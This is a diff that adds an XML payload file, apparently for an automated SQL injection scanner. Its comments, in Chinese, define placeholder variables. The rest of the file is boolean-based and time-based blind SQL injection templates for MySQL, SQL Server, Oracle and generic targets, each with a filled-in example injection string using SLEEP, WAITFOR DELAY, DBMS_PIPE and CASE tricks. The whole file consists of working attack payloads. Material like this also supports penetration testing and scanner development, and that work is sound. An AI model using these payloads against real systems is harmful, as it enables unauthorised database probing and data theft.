@@ -1,0 +1,83 @@
+<?xml version="1.0" encoding="UTF-8"?>
+
+<!-- 
+占位符：
+    $RR 数字
+    $FR -> firstR,$RR的第一个数字，比如：'2019' -> '2'
+    $FOUR -> $RR的随机一个位置，比如：1，2，3，4
+    $FH -> 符号 ' "
+    $QFH -> 前符号 ' (' ((' " (" (("
+    $HFH -> 后符号 ' ') ')) " ") "))
+    $S -> 字符串[a-zA-Z]
+    $T -> 时间
+    $HZ -> 表示需要后缀 
+    $VALUE -> 参数本身的值，如id=11,则$VALUE=11
+    $XHX -> 表示下划线 _
+-->
+
+<root>
+    <type value="bool">
+        <!-- MySQL -->
+        <dbms value="MySQL">
+            <!--    e,g    id=1' RLIKE (SELECT (CASE WHEN (4058=6681) THEN 1 ELSE 0x28 END)) AND 'Jore'='Jore  -->
+            <payload value="RLIKE (SELECT (CASE WHEN ($R1=$R2) THEN 1 ELSE 0x28 END))$HZ"/>
+        </dbms>
+        <dbms value="SQLServer">
+            <!--    e,g    id=1',(SELECT (CASE WHEN (4086=1166) THEN 1 ELSE 4086*(SELECT 4086 UNION ALL SELECT 1166) END))减减 QiIo  -->
+            <payload value=",(SELECT (CASE WHEN ($R1=$R2) THEN 1 ELSE $R1*(SELECT $R1 UNION ALL SELECT $R2) END))-- $S"/>
+        </dbms>
+        <dbms value="Oracle">
+            <!--    e,g    id=1'||1339/3396||'  -->
+            <payload value="||$R1/$R2||$QFH"/>
+            <!--    e,g    id=1'||1640/(DECODE(INSTR('1640','1',1),1,1640,0))||'1640  -->
+            <payload value="||$R1/(DECODE(INSTR('$R1','$FR',1),1,$R2,0))||$QFH$R1"/>
+            <!--    e,g    id=RLIKE (CASE WHEN (2203 LIKE 4020) THEN 1 ELSE 0x28 END),1  -->
+            <payload value="RLIKE (CASE WHEN ($R1 LIKE $R2) THEN 1 ELSE 0x28 END),$VALUE"/>
+            <!--    e,g    id=1||2596/(CASE WHEN 2596=4693 THEN 2596 ELSE 0 END)||7323  -->
+            <payload value="||$R1/(CASE WHEN $R1=$R2 THEN $R1 ELSE 0 END)||$QFH$RR"/>
+            <!-- 1' AND (SELECT (CASE WHEN (5369=3801) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5369) END) FROM DUAL) IS NULL减减 EmJq -->
+            <payload value="AND (SELECT (CASE WHEN ($R1=$R2) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,$R1) END) FROM DUAL) IS NULL-- $S"/>
+            <!-- 1',(SELECT (CASE WHEN (3584=3378) THEN 1 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)减减 CGMt -->
+            <payload value=",(SELECT (CASE WHEN ($R1=$R2) THEN 1 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)-- $S"/>
+        </dbms>
+        <dbms value="NULL">
+            <!--    e,g    id=1' AND 3903 LIKE 8342 AND 'nYPT' = 'nYPT -->
+            <payload value="AND$QFH$R1$HFHLIKE$QFH$R2$HFH$HZ"/>
+            <!--    e,g    id=1' AND 9150=(SELECT (CASE WHEN (9150=3927) THEN 9150 ELSE (SELECT 3927 UNION SELECT 1977) END))减减 VrkX -->
+            <payload value="AND $R1=(SELECT (CASE WHEN ($R1=$R2) THEN $R1 ELSE (SELECT $R2 UNION SELECT $R3) END))-- $S"/>
+            <!--    e,g    id=1'AND'7604'LIKE'_% -->
+            <payload value="AND$QFH$RR$HFHLIKE$QFH_$XHX%"/>
+            <!--    e,g    id=1'%26%26'2103'LIKE'4262  -->
+            <payload value="%26%26$QFH$R1$HFHLIKE$QFH$R2"/>
+        </dbms>
+    </type>
+
+    <type value="time">
+        <dbms value="MySQL">
+            <!--    e,g    id=1' AND SLEEP(5) AND 'PXsP'='PXsP  -->
+            <payload value="AND SLEEP(5)$HZ"/>
+            <!--    e,g    id=1' AND (SELECT * FROM (SELECT(SLEEP(5)))xEUt) AND 'GB5h'='GB5h  -->
+            <payload value="AND (SELECT * FROM (SELECT(SLEEP(5)))$S)$HZ"/>
+            <!--    e,g    id=1' RLIKE SLEEP(5) AND 'N0Db'LIKE'N0Db  -->
+            <payload value="RLIKE SLEEP(5)$HZ"/>
+            <!--    e,g    id=1' RLIKE (SELECT * FROM (SELECT(SLEEP(5)))fuva) AND 'FExb'='FExb  -->
+            <payload value="RLIKE (SELECT * FROM (SELECT(SLEEP(5)))$S)$HZ"/>
+        </dbms>
+        <dbms value="SQLServer">
+            <!--    e,g    id=-9834';WAITFOR DELAY '0:0:5'减减 JTYU  -->
+            <payload value=";WAITFOR DELAY '0:0:5'-- $S"/>
+            <!--    e,g    id=-9834' WAITFOR DELAY '0:0:5'减减 nZwc  -->
+            <payload value="WAITFOR DELAY '0:0:5'-- $S"/>
+            <!--    e,g    id=-9834' AND 2531=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND 'PuVU'='PuVU  -->
+            <payload value="AND $RR=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)$HZ"/>
+        </dbms>
+        <dbms value="Oracle">
+            <!--    e,g    id=1' AND 5215=DBMS_PIPE.RECEIVE_MESSAGE(CHR(103)||CHR(101)||CHR(65)||CHR(81),5) AND 'kR2F'='kR2F  -->
+            <payload value="AND $RR=DBMS_PIPE.RECEIVE_MESSAGE(CHR(103)||CHR(101)||CHR(65)||CHR(81),5)$HZ"/>
+            <!--    e,g    id=1' AND 6451=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND 'tYTb'='tYTb  -->
+            <payload value="AND $RR=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)$HZ"/>
+            <!--    e,g    id=-9834' OR '9787' LIKE DECODE(INSTR('9787','99',1),1,DBMS_PIPE.RECEIVE_MESSAGE(CHR(103)||CHR(101)||CHR(65)||CHR(81),5),0) AND 'LTOw'LIKE'LTOw  -->
+            <payload value="OR $FH$RR$FH LIKE DECODE(INSTR($FH$RR$FH,$FH99$FH,1),1,DBMS_PIPE.RECEIVE_MESSAGE(CHR(103)||CHR(101)||CHR(65)||CHR(81),5),0)$HZ"/>
+        </dbms>
+    </type>
+</root>
